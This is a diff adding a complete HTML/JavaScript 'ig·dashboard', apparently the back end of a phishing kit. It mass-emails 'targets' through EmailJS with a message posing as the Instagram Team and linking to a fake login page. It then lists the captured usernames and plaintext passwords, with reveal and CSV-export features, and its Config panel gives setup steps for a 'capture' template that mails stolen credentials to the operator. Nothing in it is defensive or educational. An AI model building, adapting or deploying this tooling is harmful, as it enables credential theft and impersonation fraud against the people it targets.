@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --ig: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+  --bg: #0f0f11;
+  --surface: #18181b;
+  --surface2: #222226;
+  --border: rgba(255,255,255,0.08);
+  --border2: rgba(255,255,255,0.14);
+  --text: #f4f4f5;
+  --muted: #71717a;
+  --accent: #e6683c;
+  --success: #22c55e;
+  --warn: #f59e0b;
+  --danger: #ef4444;
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'Sora', sans-serif;
+}
+
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+
+/* ── top bar ── */
+.topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 28px;
+  height: 56px;
+  border-bottom: 1px solid var(--border);
+  background: var(--surface);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.topbar-logo {
+  font-size: 18px;
+  font-weight: 600;
+  background: var(--ig);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  letter-spacing: -0.5px;
+}
+.topbar-right { display: flex; align-items: center; gap: 10px; }
+.pill {
+  padding: 4px 12px;
+  border-radius: 99px;
+  font-size: 11px;
+  font-weight: 500;
+  border: 1px solid var(--border2);
+  background: var(--surface2);
+  color: var(--muted);
+  cursor: pointer;
+  transition: all .15s;
+}
+.pill:hover { border-color: var(--accent); color: var(--text); }
+.pill.active { background: var(--accent); color: #fff; border-color: var(--accent); }
+
+/* ── layout ── */
+.layout {
+  display: flex;
+  flex: 1;
+  min-height: 0;
+}
+.sidebar {
+  width: 200px;
+  flex-shrink: 0;
+  border-right: 1px solid var(--border);
+  padding: 20px 12px;
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+}
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 9px 12px;
+  border-radius: 8px;
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--muted);
+  cursor: pointer;
+  transition: all .15s;
+  border: 1px solid transparent;
+}
+.nav-item:hover { background: var(--surface2); color: var(--text); }
+.nav-item.active { background: var(--surface2); color: var(--text); border-color: var(--border2); }
+.nav-dot {
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: var(--muted);
+  flex-shrink: 0;
+}
+.nav-item.active .nav-dot { background: var(--accent); }
+
+.main { flex: 1; overflow-y: auto; padding: 28px; }
+
+/* ── panels ── */
+.panel { display: none; }
+.panel.active { display: block; }
+
+/* ── section heading ── */
+.sec-head {
+  display: flex;
+  align-items: baseline;
+  justify-content: space-between;
+  margin-bottom: 20px;
+}
+.sec-title { font-size: 18px; font-weight: 600; }
+.sec-sub { font-size: 12px; color: var(--muted); margin-top: 2px; }
+
+/* ── metrics row ── */
+.metrics { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px; margin-bottom: 28px; }
+.metric-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 18px 20px;
+}
+.metric-val { font-size: 28px; font-weight: 600; letter-spacing: -1px; }
+.metric-label { font-size: 11px; color: var(--muted); margin-top: 4px; text-transform: uppercase; letter-spacing: .05em; }
+
+/* ── cards ── */
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 22px 24px;
+  margin-bottom: 20px;
+}
+.card-title { font-size: 13px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; margin-bottom: 16px; }
+
+/* ── form elements ── */
+label.field-label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 6px; margin-top: 14px; }
+label.field-label:first-child { margin-top: 0; }
+input[type=text], input[type=email], textarea {
+  width: 100%;
+  background: var(--surface2);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+  padding: 9px 12px;
+  font-size: 13px;
+  font-family: var(--sans);
+  color: var(--text);
+  outline: none;
+  transition: border-color .15s;
+}
+input:focus, textarea:focus { border-color: var(--accent); }
+textarea { resize: vertical; min-height: 110px; line-height: 1.6; }
+
+/* ── tag input ── */
+.tag-box {
+  min-height: 44px;
+  background: var(--surface2);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+  padding: 6px 8px;
+  display: flex;
+  flex-wrap: wrap;
+  gap: 5px;
+  cursor: text;
+  transition: border-color .15s;
+}
+.tag-box:focus-within { border-color: var(--accent); }
+.tag-box input {
+  background: transparent;
+  border: none;
+  outline: none;
+  font-size: 13px;
+  font-family: var(--sans);
+  color: var(--text);
+  min-width: 160px;
+  padding: 2px 4px;
+  flex: 1;
+}
+.email-tag {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  background: rgba(230,104,60,0.15);
+  border: 1px solid rgba(230,104,60,0.35);
+  border-radius: 6px;
+  padding: 2px 8px;
+  font-size: 12px;
+  color: #f4a27a;
+}
+.email-tag .rm { cursor: pointer; color: var(--muted); font-size: 14px; line-height: 1; }
+.email-tag .rm:hover { color: var(--danger); }
+
+/* ── buttons ── */
+.btn {
+  padding: 9px 20px;
+  border-radius: 8px;
+  border: 1px solid var(--border2);
+  background: transparent;
+  color: var(--text);
+  font-size: 13px;
+  font-weight: 500;
+  font-family: var(--sans);
+  cursor: pointer;
+  transition: all .15s;
+}
+.btn:hover { background: var(--surface2); border-color: var(--border2); }
+.btn-accent {
+  background: var(--ig);
+  border-color: transparent;
+  color: #fff;
+}
+.btn-accent:hover { opacity: .88; background: var(--ig); }
+.btn-accent:disabled { opacity: .45; cursor: not-allowed; }
+.btn-sm { padding: 5px 12px; font-size: 12px; }
+
+.flex-end { display: flex; justify-content: flex-end; gap: 10px; margin-top: 16px; }
+
+/* ── email preview ── */
+.preview {
+  background: var(--surface2);
+  border: 1px dashed var(--border2);
+  border-radius: 8px;
+  padding: 16px;
+  font-size: 13px;
+  line-height: 1.7;
+  color: var(--muted);
+  margin-top: 12px;
+}
+.preview strong { color: var(--text); }
+.preview a { color: var(--accent); }
+
+/* ── log line ── */
+.log-line { font-size: 12px; color: var(--muted); margin-top: 10px; min-height: 18px; }
+.log-ok { color: var(--success); }
+.log-err { color: var(--danger); }
+
+/* ── responses table ── */
+.tbl-wrap {
+  overflow-x: auto;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+}
+table { width: 100%; border-collapse: collapse; font-size: 13px; }
+thead th {
+  padding: 10px 14px;
+  text-align: left;
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: .05em;
+  border-bottom: 1px solid var(--border);
+  background: var(--surface);
+}
+tbody td {
+  padding: 11px 14px;
+  border-bottom: 1px solid var(--border);
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--text);
+  vertical-align: middle;
+}
+tbody tr:last-child td { border-bottom: none; }
+tbody tr:hover td { background: var(--surface2); }
+
+.mono { font-family: var(--mono); }
+.pwd-cell { display: flex; align-items: center; gap: 8px; }
+.pwd-mask { letter-spacing: 2px; color: var(--muted); }
+.toggle-eye {
+  background: none;
+  border: none;
+  color: var(--muted);
+  cursor: pointer;
+  font-size: 13px;
+  padding: 0;
+  line-height: 1;
+  transition: color .1s;
+}
+.toggle-eye:hover { color: var(--text); }
+
+.badge {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 99px;
+  font-size: 11px;
+  font-weight: 500;
+}
+.badge-new { background: rgba(34,197,94,.12); color: #4ade80; border: 1px solid rgba(34,197,94,.25); }
+.badge-seen { background: rgba(113,113,122,.12); color: var(--muted); border: 1px solid var(--border); }
+
+/* ── config form ── */
+.cfg-grid { display: grid; gap: 12px; }
+.cfg-row { display: grid; grid-template-columns: 180px 1fr; gap: 10px; align-items: center; }
+.cfg-row label { font-size: 12px; color: var(--muted); }
+.cfg-hint { font-size: 11px; color: var(--muted); margin-top: 4px; }
+
+/* ── empty state ── */
+.empty {
+  text-align: center;
+  padding: 40px 20px;
+  color: var(--muted);
+  font-size: 13px;
+}
+
+/* ── status indicator ── */
+.status-row { display: flex; align-items: center; gap: 8px; font-size: 12px; color: var(--muted); }
+.dot { width: 8px; height: 8px; border-radius: 50%; background: var(--warn); flex-shrink: 0; }
+.dot.ok { background: var(--success); }
+
+/* ── toast ── */
+.toast {
+  position: fixed;
+  bottom: 28px;
+  left: 50%;
+  transform: translateX(-50%) translateY(80px);
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  color: var(--text);
+  padding: 10px 20px;
+  border-radius: 10px;
+  font-size: 13px;
+  transition: transform .25s ease;
+  z-index: 999;
+  white-space: nowrap;
+}
+.toast.show { transform: translateX(-50%) translateY(0); }
+
+@media(max-width:640px){
+  .sidebar { display: none; }
+  .main { padding: 16px; }
+  .cfg-row { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<!-- ── top bar ── -->
+<div class="topbar">
+  <div class="topbar-logo">ig·dashboard</div>
+  <div class="topbar-right">
+    <div class="status-row">
+      <div class="dot" id="status-dot"></div>
+      <span id="status-txt">Not configured</span>
+    </div>
+  </div>
+</div>
+
+<div class="layout">
+  <!-- ── sidebar ── -->
+  <nav class="sidebar">
+    <div class="nav-item active" onclick="nav('overview',this)"><div class="nav-dot"></div>Overview</div>
+    <div class="nav-item" onclick="nav('send',this)"><div class="nav-dot"></div>Send invites</div>
+    <div class="nav-item" onclick="nav('responses',this)"><div class="nav-dot"></div>Responses</div>
+    <div class="nav-item" onclick="nav('config',this)"><div class="nav-dot"></div>Config</div>
+  </nav>
+
+  <main class="main">
+
+    <!-- ── OVERVIEW ── -->
+    <div id="panel-overview" class="panel active">
+      <div class="sec-head">
+        <div>
+          <div class="sec-title">Overview</div>
+          <div class="sec-sub">Campaign summary</div>
+        </div>
+      </div>
+      <div class="metrics">
+        <div class="metric-card">
+          <div class="metric-val" id="m-sent">0</div>
+          <div class="metric-label">Invites sent</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-val" id="m-resp">0</div>
+          <div class="metric-label">Responses</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-val" id="m-new">0</div>
+          <div class="metric-label">New (unread)</div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">Quick start</div>
+        <p style="font-size:13px;color:var(--muted);line-height:1.8;">
+          1. Go to <strong style="color:var(--text)">Config</strong> and save your EmailJS keys.<br>
+          2. Go to <strong style="color:var(--text)">Send invites</strong>, add recipients, and fire invite emails.<br>
+          3. When targets submit your login form, entries appear under <strong style="color:var(--text)">Responses</strong>.<br>
+          4. Responses are stored locally in your browser — no backend needed.
+        </p>
+      </div>
+    </div>
+
+    <!-- ── SEND INVITES ── -->
+    <div id="panel-send" class="panel">
+      <div class="sec-head">
+        <div>
+          <div class="sec-title">Send invites</div>
+          <div class="sec-sub">Email targets a link to your login page</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Recipients</div>
+        <div class="tag-box" id="tag-box" onclick="document.getElementById('tag-input').focus()">
+          <input id="tag-input" placeholder="Type email and press Enter…" onkeydown="handleTag(event)"/>
+        </div>
+        <div style="font-size:11px;color:var(--muted);margin-top:6px;">Press <code style="background:var(--surface2);padding:1px 5px;border-radius:4px;font-size:11px;">Enter</code> or <code style="background:var(--surface2);padding:1px 5px;border-radius:4px;font-size:11px;">,</code> after each address</div>
+
+        <label class="field-label">Email subject</label>
+        <input type="text" id="inv-subject" value="Someone shared a post with you on Instagram"/>
+
+        <label class="field-label">Email body</label>
+        <textarea id="inv-body">Hi,
+
+Someone shared a post with you on Instagram. Click the link below to view it:
+
+{{form_url}}
+
+— Instagram Team</textarea>
+
+        <div class="preview" id="inv-preview"></div>
+
+        <div class="flex-end">
+          <button class="btn btn-sm" onclick="clearTags()">Clear all</button>
+          <button class="btn btn-accent" id="send-btn" onclick="sendInvites()">Send invites</button>
+        </div>
+        <div class="log-line" id="send-log"></div>
+      </div>
+    </div>
+
+    <!-- ── RESPONSES ── -->
+    <div id="panel-responses" class="panel">
+      <div class="sec-head">
+        <div>
+          <div class="sec-title">Responses</div>
+          <div class="sec-sub">Captured login submissions</div>
+        </div>
+        <div style="display:flex;gap:8px;">
+          <button class="btn btn-sm" onclick="clearResponses()" style="color:var(--danger);border-color:rgba(239,68,68,.3);">Clear all</button>
+          <button class="btn btn-sm" onclick="exportCSV()">Export CSV</button>
+        </div>
+      </div>
+
+      <div class="tbl-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Time</th>
+              <th>Username / Email</th>
+              <th>Password</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="resp-tbody">
+            <tr><td colspan="5"><div class="empty">No responses yet. Waiting for submissions…</div></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── CONFIG ── -->
+    <div id="panel-config" class="panel">
+      <div class="sec-head">
+        <div>
+          <div class="sec-title">Config</div>
+          <div class="sec-sub">EmailJS credentials &amp; form URL</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">EmailJS keys</div>
+        <div class="cfg-grid">
+          <div>
+            <label class="field-label">Public Key</label>
+            <input type="text" id="cfg-pubkey" placeholder="e.g. aBcDeFgHiJkLmNoP"/>
+            <div class="cfg-hint">EmailJS → Account → General → Public Key</div>
+          </div>
+          <div>
+            <label class="field-label">Service ID</label>
+            <input type="text" id="cfg-svcid" placeholder="e.g. service_xxxxxxx"/>
+            <div class="cfg-hint">EmailJS → Email Services → your service</div>
+          </div>
+          <div>
+            <label class="field-label">Invite Template ID</label>
+            <input type="text" id="cfg-inv-tmpl" placeholder="e.g. template_xxxxxxx"/>
+            <div class="cfg-hint">Template used to send invite emails. Variables: <code style="font-size:11px;background:var(--surface2);padding:1px 4px;border-radius:3px;">{{to_email}} {{subject}} {{body}} {{form_url}}</code></div>
+          </div>
+        </div>
+        <div class="flex-end">
+          <button class="btn btn-accent" onclick="saveConfig()">Save config</button>
+        </div>
+        <div class="log-line" id="cfg-log"></div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Login page URL</div>
+        <label class="field-label">Your GitHub Pages form URL</label>
+        <input type="text" id="cfg-formurl" placeholder="https://yourname.github.io/your-repo/"/>
+        <div class="cfg-hint">Inserted as <code style="font-size:11px;background:var(--surface2);padding:1px 4px;border-radius:3px;">{{form_url}}</code> in invite emails and shown in response rows.</div>
+        <div class="flex-end">
+          <button class="btn btn-accent" onclick="saveConfig()">Save</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">EmailJS — capture template setup</div>
+        <p style="font-size:13px;color:var(--muted);line-height:1.8;">
+          In your EmailJS account, create a <strong style="color:var(--text)">second template</strong> (the "capture" template) with these variables:<br><br>
+          <code style="background:var(--surface2);padding:3px 7px;border-radius:5px;font-size:12px;">{{username}}</code>&nbsp;&nbsp;
+          <code style="background:var(--surface2);padding:3px 7px;border-radius:5px;font-size:12px;">{{password}}</code>&nbsp;&nbsp;
+          <code style="background:var(--surface2);padding:3px 7px;border-radius:5px;font-size:12px;">{{time}}</code>&nbsp;&nbsp;
+          <code style="background:var(--surface2);padding:3px 7px;border-radius:5px;font-size:12px;">{{user_agent}}</code><br><br>
+          Then paste its template ID into <strong style="color:var(--text)">index.html</strong> as <code style="background:var(--surface2);padding:3px 7px;border-radius:5px;font-size:12px;">EJS_TEMPLATE_ID</code>.<br>
+          When a target submits the login form, the email arrives in your inbox and this dashboard auto-parses it from <strong style="color:var(--text)">localStorage</strong>.
+        </p>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+//  EMAILJS CONFIG — must match index.html exactly
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+const EJS_PUBLIC_KEY  = "YOUR_PUBLIC_KEY";
+const EJS_SERVICE_ID  = "YOUR_SERVICE_ID";
+const EJS_INV_TMPL    = "YOUR_INVITE_TEMPLATE"; // template for sending invites
+
+emailjs.init({ publicKey: EJS_PUBLIC_KEY });
+
+// ── state ──
+let tags       = [];
+let sentCount  = 0;
+let config     = {};
+
+// ── nav ──
+function nav(id, el) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('panel-' + id).classList.add('active');
+  el.classList.add('active');
+  if (id === 'responses') renderResponses();
+  if (id === 'send') updatePreview();
+}
+
+// ── toast ──
+function toast(msg, dur = 3000) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), dur);
+}
+
+// ── tag input ──
+function handleTag(e) {
+  if (e.key === 'Enter' || e.key === ',') {
+    e.preventDefault();
+    const val = e.target.value.trim().replace(/,$/, '');
+    if (val && val.includes('@')) addTag(val);
+    e.target.value = '';
+    updatePreview();
+  } else if (e.key === 'Backspace' && e.target.value === '' && tags.length) {
+    removeTag(tags[tags.length - 1]);
+  }
+}
+
+function addTag(email) {
+  if (tags.includes(email)) return;
+  tags.push(email);
+  const span = document.createElement('span');
+  span.className = 'email-tag';
+  span.id = 'etag-' + email.replace(/[^a-z0-9]/gi, '_');
+  span.innerHTML = email + '<span class="rm" onclick="removeTag(\'' + email + '\')">×</span>';
+  document.getElementById('tag-box').insertBefore(span, document.getElementById('tag-input'));
+}
+
+function removeTag(email) {
+  tags = tags.filter(e => e !== email);
+  const el = document.getElementById('etag-' + email.replace(/[^a-z0-9]/gi, '_'));
+  if (el) el.remove();
+}
+
+function clearTags() {
+  tags = [];
+  document.querySelectorAll('.email-tag').forEach(t => t.remove());
+}
+
+// ── invite preview ──
+function updatePreview() {
+  const subj = document.getElementById('inv-subject')?.value || '';
+  const body = document.getElementById('inv-body')?.value || '';
+  const url  = config.formUrl || '[your form URL]';
+  const preview = document.getElementById('inv-preview');
+  if (!preview) return;
+  preview.innerHTML =
+    '<strong>To:</strong> ' + (tags.length ? tags.join(', ') : '<em>no recipients yet</em>') + '<br>' +
+    '<strong>Subject:</strong> ' + subj + '<br><br>' +
+    body.replace(/{{form_url}}/g, '<a>' + url + '</a>').replace(/\n/g, '<br>');
+}
+
+document.addEventListener('input', e => {
+  if (e.target.id === 'inv-subject' || e.target.id === 'inv-body') updatePreview();
+});
+
+// ── send invites ──
+async function sendInvites() {
+  const log = document.getElementById('send-log');
+  const btn = document.getElementById('send-btn');
+  if (!tags.length) { log.innerHTML = '<span class="log-err">Add at least one recipient.</span>'; return; }
+
+  const svcId  = config.svcId  || EJS_SERVICE_ID;
+  const tmplId = config.invTmpl || EJS_INV_TMPL;
+  const pubKey = config.pubKey  || EJS_PUBLIC_KEY;
+
+  if (svcId === 'YOUR_SERVICE_ID') {
+    log.innerHTML = '<span class="log-err">Save your EmailJS keys in Config first.</span>';
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'Sending…';
+  log.textContent = '';
+
+  emailjs.init({ publicKey: pubKey });
+
+  let ok = 0, fail = 0;
+  for (const email of tags) {
+    try {
+      await emailjs.send(svcId, tmplId, {
+        to_email: email,
+        subject:  document.getElementById('inv-subject').value,
+        body:     document.getElementById('inv-body').value.replace(/{{form_url}}/g, config.formUrl || ''),
+        form_url: config.formUrl || '',
+      });
+      ok++;
+    } catch (err) {
+      console.error(err);
+      fail++;
+    }
+  }
+
+  sentCount += ok;
+  document.getElementById('m-sent').textContent = sentCount;
+  btn.disabled = false;
+  btn.textContent = 'Send invites';
+  log.innerHTML = '<span class="' + (fail ? 'log-err' : 'log-ok') + '">'
+    + ok + ' sent' + (fail ? ', ' + fail + ' failed' : '') + '.</span>';
+  toast(ok + ' invite' + (ok !== 1 ? 's' : '') + ' sent!');
+}
+
+// ── responses (stored in localStorage by index.html via EmailJS webhook isn't possible,
+//    so index.html POSTs to this dashboard's localStorage key on same origin,
+//    OR you manually paste received email data here) ──
+//
+//    For same-origin: index.html writes to localStorage key "ig_responses".
+//    If dashboard is on a different origin, use the "Add manually" button below.
+
+function getResponses() {
+  try { return JSON.parse(localStorage.getItem('ig_responses') || '[]'); } catch { return []; }
+}
+function saveResponses(arr) { localStorage.setItem('ig_responses', JSON.stringify(arr)); }
+
+function renderResponses() {
+  const data = getResponses();
+  const tbody = document.getElementById('resp-tbody');
+  document.getElementById('m-resp').textContent = data.length;
+  const newCount = data.filter(r => !r.seen).length;
+  document.getElementById('m-new').textContent = newCount;
+
+  if (!data.length) {
+    tbody.innerHTML = '<tr><td colspan="5"><div class="empty">No responses yet.</div></td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = data.map((r, i) => `
+    <tr>
+      <td>${i + 1}</td>
+      <td>${r.time || '—'}</td>
+      <td class="mono">${r.username || '—'}</td>
+      <td>
+        <div class="pwd-cell">
+          <span class="pwd-mask" id="pwd-${i}">••••••••</span>
+          <button class="toggle-eye" onclick="togglePwd(${i},'${escStr(r.password)}')" title="reveal">👁</button>
+        </div>
+      </td>
+      <td><span class="badge ${r.seen ? 'badge-seen' : 'badge-new'}" onclick="markSeen(${i})">${r.seen ? 'seen' : 'new'}</span></td>
+    </tr>
+  `).join('');
+}
+
+function escStr(s) { return (s || '').replace(/'/g, "\\'"); }
+
+function togglePwd(idx, plain) {
+  const el = document.getElementById('pwd-' + idx);
+  if (el.textContent === '••••••••') {
+    el.textContent = plain;
+    el.style.color = 'var(--text)';
+  } else {
+    el.textContent = '••••••••';
+    el.style.color = '';
+  }
+  markSeen(idx);
+}
+
+function markSeen(idx) {
+  const data = getResponses();
+  if (data[idx]) { data[idx].seen = true; saveResponses(data); renderResponses(); }
+}
+
+function clearResponses() {
+  if (!confirm('Delete all captured responses? This cannot be undone.')) return;
+  localStorage.removeItem('ig_responses');
+  renderResponses();
+  toast('Responses cleared.');
+}
+
+function exportCSV() {
+  const data = getResponses();
+  if (!data.length) { toast('Nothing to export.'); return; }
+  const rows = [['#','Time','Username','Password']];
+  data.forEach((r, i) => rows.push([i + 1, r.time, r.username, r.password]));
+  const csv = rows.map(r => r.map(c => '"' + String(c).replace(/"/g, '""') + '"').join(',')).join('\n');
+  const a = document.createElement('a');
+  a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
+  a.download = 'ig_responses.csv';
+  a.click();
+}
+
+// ── config ──
+function saveConfig() {
+  config = {
+    pubKey:   document.getElementById('cfg-pubkey').value.trim(),
+    svcId:    document.getElementById('cfg-svcid').value.trim(),
+    invTmpl:  document.getElementById('cfg-inv-tmpl').value.trim(),
+    formUrl:  document.getElementById('cfg-formurl').value.trim(),
+  };
+  localStorage.setItem('ig_dashboard_cfg', JSON.stringify(config));
+  const ok = config.pubKey && config.svcId && config.invTmpl;
+  document.getElementById('status-dot').className = 'dot ' + (ok ? 'ok' : '');
+  document.getElementById('status-txt').textContent = ok ? 'Configured' : 'Partially configured';
+  document.getElementById('cfg-log').innerHTML = '<span class="' + (ok ? 'log-ok' : 'log-err') + '">'
+    + (ok ? '✓ Config saved.' : '⚠ Some fields missing.') + '</span>';
+  emailjs.init({ publicKey: config.pubKey || EJS_PUBLIC_KEY });
+  toast('Config saved.');
+}
+
+function loadConfig() {
+  try {
+    const c = JSON.parse(localStorage.getItem('ig_dashboard_cfg') || '{}');
+    if (!c.pubKey) return;
+    config = c;
+    document.getElementById('cfg-pubkey').value  = c.pubKey  || '';
+    document.getElementById('cfg-svcid').value   = c.svcId   || '';
+    document.getElementById('cfg-inv-tmpl').value = c.invTmpl || '';
+    document.getElementById('cfg-formurl').value  = c.formUrl || '';
+    const ok = c.pubKey && c.svcId && c.invTmpl;
+    document.getElementById('status-dot').className = 'dot ' + (ok ? 'ok' : '');
+    document.getElementById('status-txt').textContent = ok ? 'Configured' : 'Partially configured';
+    emailjs.init({ publicKey: c.pubKey });
+  } catch {}
+}
+
+// ── init ──
+loadConfig();
+updatePreview();
+</script>
+</body>
+</html>
